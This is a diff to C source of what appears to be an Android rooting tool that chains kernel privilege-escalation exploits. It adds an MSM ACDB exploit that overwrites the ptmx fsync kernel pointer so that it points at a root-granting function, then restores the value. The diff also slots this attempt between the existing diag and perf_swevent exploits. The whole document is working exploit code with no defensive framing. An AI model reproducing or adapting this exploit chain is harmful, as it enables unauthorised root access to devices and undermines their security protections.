@@ -15,6 +15,7 @@
 #include "ptmx.h"
 #include "libdiagexploit/diag.h"
 #include "libperf_event_exploit/perf_event.h"
+#include "libmsm_acdb_exploit/acdb.h"
 
 void
 obtain_root_privilege(void)
@@ -47,6 +48,20 @@ attempt_diag_exploit(unsigned long int address)
 }
 
 static bool
+attempt_acdb_exploit(unsigned long int address, unsigned long int original_value)
+{
+  if (acdb_run_exploit(address, (int)&obtain_root_privilege,
+                       run_obtain_root_privilege, NULL)) {
+
+    acdb_write_value_at_address(address, original_value);
+
+    return true;
+  }
+
+  return false;
+}
+
+static bool
 run_exploit(void)
 {
   unsigned long int ptmx_fsync_address;
@@ -62,8 +77,15 @@ run_exploit(void)
   if (attempt_diag_exploit(ptmx_fsync_address)) {
     return true;
   }
+  printf("\n");
 
-  printf("\nAttempt perf_swevent exploit...\n");
+  printf("Attempt acdb exploit...\n");
+  if (attempt_acdb_exploit(ptmx_fsync_address, 0)) {
+    return true;
+  }
+  printf("\n");
+
+  printf("Attempt perf_swevent exploit...\n");
   return perf_swevent_run_exploit(ptmx_fsync_address, (int)&obtain_root_privilege,
                                   run_obtain_root_privilege, NULL);
 }
